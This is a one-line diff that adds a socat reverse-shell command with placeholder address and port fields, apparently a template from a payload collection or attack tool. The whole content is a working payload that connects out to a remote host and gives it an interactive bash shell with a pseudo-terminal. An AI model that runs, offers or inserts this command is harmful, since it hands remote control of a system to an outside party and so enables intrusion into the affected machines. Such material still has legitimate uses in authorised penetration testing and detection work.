@@ -1,0 +1,1 @@
+socat TCP:__IPADDR__:__PORT__ EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
